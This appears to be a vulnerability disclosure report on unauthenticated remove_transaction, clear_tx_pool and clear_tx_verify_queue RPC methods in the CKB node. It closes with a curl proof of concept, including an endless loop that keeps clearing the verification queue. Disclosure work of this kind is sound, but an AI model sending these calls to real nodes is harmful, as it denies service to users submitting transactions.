### Title
Unauthenticated `remove_transaction`, `clear_tx_pool`, and `clear_tx_verify_queue` RPC Methods Allow Any Caller to Perform Targeted or Mass Mempool DoS — (`rpc/src/module/pool.rs`)

---

### Summary

The CKB JSON-RPC `Pool` module exposes three destructive, state-mutating methods — `remove_transaction`, `clear_tx_pool`, and `clear_tx_verify_queue` — with **zero authentication or per-caller authorization**. The `RpcConfig` struct contains no authentication fields, and the `ServiceBuilder` adds no access-control middleware. Any caller who can reach the RPC socket can silently evict any or all pending/proposed transactions from the mempool, or drain the entire verification queue, causing targeted or mass denial-of-service against transaction submitters.

**Exploit flow**

`remove_transaction` calls `pool_map.remove_entry_and_descendants`, which recursively removes the target transaction and every descendant from all three pool states (pending, gap, proposed) and updates all internal edge/ancestor/descendant indexes:

```rust
// tx-pool/src/pool.rs:358-361
pub(crate) fn remove_tx(&mut self, id: &ProposalShortId) -> bool {
    let entries = self.pool_map.remove_entry_and_descendants(id);
    !entries.is_empty()
}
``` [8](#0-7) 

`clear_tx_pool` wipes the entire pool in one call. `clear_tx_verify_queue` drains the async verification queue, silently discarding all transactions awaiting script execution:

```rust
// tx-pool/src/service.rs:981-985
Message::ClearVerifyQueue(Request { responder, .. }) => {
    service.verify_queue.write().await.clear();
    ...
}
``` [9](#0-8) 

---

### Impact Explanation

- **Targeted DoS**: An attacker who observes a victim's transaction hash (visible via `get_raw_tx_pool`) can call `remove_transaction` to silently evict it before it is committed to a block. The victim's transaction disappears without error; the victim must resubmit.
- **Mass DoS**: `clear_tx_pool` atomically removes every pending, gap, and proposed transaction. All in-flight user transactions are lost. Miners lose their assembled block candidates.
- **Verification starvation**: `clear_tx_verify_queue` drains the async script-execution queue, causing all transactions currently being verified to be silently discarded. Combined with repeated `clear_tx_verify_queue` calls, an attacker can prevent any new transaction from ever completing verification.
- **Cascading effect**: Because `remove_entry_and_descendants` removes the entire descendant chain, removing one parent transaction can cascade to evict many child transactions submitted by different users. [10](#0-9) 

---

### Likelihood Explanation

The RPC default listen address is `127.0.0.1:8114`, which limits exposure to the local machine. However:

1. The CKB documentation explicitly warns that operators frequently misconfigure the RPC to listen on `0.0.0.0`, making it reachable from the internet.
2. Any local process (co-hosted service, malicious dependency, compromised script) can reach the socket without any credential.
3. The `Pool` module — including all three destructive methods — is **enabled by default** with no opt-out for individual methods.
4. The RESEARCHER.md explicitly lists "Malicious API/RPC/web client submitting crafted inputs at scale" as a valid in-scope attacker profile.
5. No rate limiting exists on individual method calls; an attacker can loop `remove_transaction` or `clear_tx_pool` indefinitely. [11](#0-10) [12](#0-11) 

---

### Recommendation

1. **Split destructive methods into a separate, opt-in RPC module** (e.g., `PoolAdmin`) that is disabled by default, analogous to how `IntegrationTest` and `Debug` are disabled by default.
2. **Add a token-based or IP-allowlist authentication layer** to the RPC server for any method that mutates pool state.
3. **Remove `remove_transaction` and `clear_tx_pool` from the default `Pool` module** or gate them behind a config flag (`allow_pool_mutation = false` by default).
4. As a minimum mitigation, document that `Pool` module enablement grants full destructive access and operators must firewall the RPC port.

---

### Proof of Concept

```bash
# Step 1: Observe a victim's pending transaction hash
curl -s http://127.0.0.1:8114 -X POST -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"get_raw_tx_pool","params":[false]}'
# => {"result":{"pending":["0xabc..."],...}}

# Step 2: Silently evict the victim's transaction (no auth required)
curl -s http://127.0.0.1:8114 -X POST -H 'Content-Type: application/json' \
  -d '{"id":2,"jsonrpc":"2.0","method":"remove_transaction","params":["0xabc..."]}'
# => {"result":true}

# Step 3: Wipe the entire mempool (no auth required)
curl -s http://127.0.0.1:8114 -X POST -H 'Content-Type: application/json' \
  -d '{"id":3,"jsonrpc":"2.0","method":"clear_tx_pool","params":[]}'
# => {"result":null}

# Step 4: Prevent any new transaction from completing verification (loop)
while true; do
  curl -s http://127.0.0.1:8114 -X POST -H 'Content-Type: application/json' \
    -d '{"id":4,"jsonrpc":"2.0","method":"clear_tx_verify_queue","params":[]}'
done
```

All three calls succeed with HTTP 200 and no credential. The victim's transactions are permanently removed from the pool; they must be resubmitted and will be evicted again on the next loop iteration. [4](#0-3) [13](#0-12)

    pub(crate) fn remove_entry_and_descendants(&mut self, id: &ProposalShortId) -> Vec<TxEntry> {
        let mut removed_ids = vec![id.to_owned()];
        removed_ids.extend(self.calc_descendants(id));

        // update links state for remove, so that we won't update_descendants_index_key in remove_entry
        for id in &removed_ids {
            self.remove_entry_links(id);
        }

        removed_ids
            .iter()
            .filter_map(|id| self.remove_entry(id))
            .collect()
    }
